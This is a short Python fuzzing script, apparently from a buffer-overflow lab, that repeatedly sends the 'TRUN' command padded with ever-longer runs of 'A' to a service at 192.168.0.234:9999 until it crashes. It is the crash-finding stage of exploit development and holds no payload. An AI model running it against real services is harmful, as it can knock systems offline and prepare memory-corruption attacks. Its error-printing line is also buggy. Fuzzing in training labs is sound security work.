#!/usr/bin/python3
import socket
import sys
from time import sleep

buffer = "A" * 100

while True:
    try:
        print("[+] Starting with %s bytes " % str(len(buffer)))
        evil_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        evil_socket.connect(('192.168.0.234', 9999))
        evil_socket.send(('TRUN /.:/' + buffer).encode())
        evil_socket.close()
        sleep(1)
        buffer = buffer + "A" * 100
    except Exception as e:
        print('Fuzzing crashed at %s bytes' % str(len(buffer)))
        print("[-] Exception:" + e.args)
        sys.exit()
